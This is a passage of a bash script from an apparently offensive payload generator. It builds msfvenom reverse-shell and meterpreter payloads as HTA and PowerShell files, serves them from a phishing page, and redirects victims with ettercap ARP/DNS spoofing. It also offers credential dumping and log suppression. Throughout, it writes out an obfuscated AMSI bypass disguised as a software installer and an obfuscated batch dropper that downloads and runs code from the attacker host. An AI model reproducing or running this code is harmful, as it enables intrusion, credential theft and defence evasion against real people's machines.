    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.bat|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -----------------------------------------------------
# build shellcode in HTA-PSH format (windows-platforms)
# reproduction of hta powershell attack in unicorn.py
# one of my favorite methods by ReL1K :D 
# -----------------------------------------------------
sh_shellcode10 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: ReL1K" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ReL1K";fi

echo "[☠] Building shellcode -> HTA-PSH format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : HTA-PSH -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f hta-psh > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f hta-psh > $IPATH/output/chars.raw"
fi

echo ""
# display generated shelcode
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
store=`cat $IPATH/output/chars.raw | awk {'print $7'}`
echo $store
echo "" && echo ""
# grab shellcode from chars.raw
Sh33L=`cat $IPATH/output/chars.raw | grep "powershell.exe -nop -w hidden -e" | cut -d '"' -f2`
# copy chars.raw to hta_attack dir
cp $IPATH/output/chars.raw $IPATH/templates/hta_attack/chars.raw
sleep 2


   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc6 ]; then
      echo "[☠] exec.hta -> found!"
      sleep 2
   else
      echo "[☠] exec.hta -> not found!"
      exit
   fi

   if [ -e $InJEc7 ]; then
      echo "[☠] index.html -> found!"
      sleep 2
   else
      echo "[☠] index.html -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc6 $IPATH/templates/hta_attack/mine[bak].hta
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates/hta_attack
# use SED to replace NaM3 and Inj3C
echo "[☠] Injecting shellcode -> $N4m.hta!"
# replace NaM3 by $N4m (var grab by venom.sh)
sed "s|NaM3|$N4m.hta|g" index.html > copy.html
mv copy.html $IPATH/output/index.html
# replace INj3C by shellcode stored in var Sh33L in 'meu_hta-psh.hta' file
sed "s|Inj3C|$Sh33L|g" exec.hta > $N4m.hta
cp $IPATH/templates/phishing/missing_plugin.png $ApAcHe/missing_plugin.png > /dev/null 2>&1
mv $N4m.hta $IPATH/output/$N4m.hta > /dev/null 2>&1
chown $user $IPATH/output/$N4m.hta > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.hta\n$IPATH/output/index.html\n\nIf needed further encrypt your hta using:\nshell/obfuscate/hta-to-javascript-crypter.html\nbefore continue...\n\nchose how to deliver: $N4m.hta" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 300) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store the 2 files in apache2 webroot and\nSend: [ http://$lhost/index.html ]\nto target machine to execute payload" --info --width 300 > /dev/null 2>&1
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi




      cd $IPATH/output
      cp $N4m.hta $ApAcHe/$N4m.hta > /dev/null 2>&1
      cp index.html $ApAcHe/index.html > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.hta|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.hta $ApAcHe/$N4m.hta
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/hta_attack/mine[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
rm $IPATH/templates/hta_attack/chars.raw > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.hta > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/missing_plugin.png > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# --------------------------------------------------------------
# build shellcode in PS1 (windows systems)
# 'Matthew Graeber' powershell <DownloadString> technic
# --------------------------------------------------------------
sh_shellcode11 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: Graeber" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Graeber";fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PSH-CMD -> WINDOWS
    |_PAYLOAD : $paylo

!

#
# use metasploit to build shellcode
# HINT: use -n to add extra bits (random) of nopsled data to evade signature detection
#
KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw" > /dev/null 2>&1
fi

# parsing shellcode data
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "$str0" > $IPATH/output/chars.raw


# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 3
echo $str0
echo "" && echo ""

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi



cd $IPATH/output/
# compiling to ps1 output format
echo "[☠] Injecting shellcode -> $N4m.ps1!"
sleep 2
OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "Write-Host \"Please Wait, installing software..\" -ForeGroundColor green;powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L" > payload.raw
else
echo "[✔] String obfuscation technic sellected .."
sleep 2
echo "[☠] Building $N4m.ps1 agent .."
# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
#
# STRING: powershell.exe -NoPRo -wIN 1 -nONi -eN Sh33L
echo "Write-Host \"Please Wait, installing software..\";pi\`ng -n 3 ww\`w.mi\`cro\`sof\`t.co\`m > \$env:tmp\\li\`ce\`nce.p\`em;\$method=(\"{1}{2}{0}\" -f'N','/','e');\$ScriptBlock = \"'Sy?s%t%e??m.Ma%na?geme?nt.Auto?mat?i%o%n.A?msi?U%t%i?ls'\";\$UBlock = \"'am?s%i%?In?it%F?ai?l%e%d'\";\$reg = \$ScriptBlock.Replace(\"?\",\"\").Replace(\"%\",\"\");\$off = \$UBlock.Replace(\"?\",\"\").Replace(\"%\",\"\");[ref].Assembly.GetType(\$reg).GetField(\$off, 'NonPublic,Static').SetValue(\$null,\$true);\$cert=(\"{1}{3}{0}{2}\" -f'N','/n','i','O');Pow\`ers\`hell.e\`Xe /No\`PR\`o  /wI\`N 1 \$cert \$method Sh33L" > payload.raw
fi
#
# parsing data
#
sed "s|Sh33L|$str0|" payload.raw > $N4m.ps1
rm $IPATH/output/payload.raw > /dev/null 2>&1


# build installer.bat (x86) to call .ps1
echo "[☠] Building installer.bat dropper .."
sleep 2
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$N4m.ps1')" > $IPATH/output/installer.bat
else
echo "@e%!%ch^O Of^f&&@c^Md%i%\".\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//'+'$lhost/$N4m.ps'+'1')" > $IPATH/output/installer.bat
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
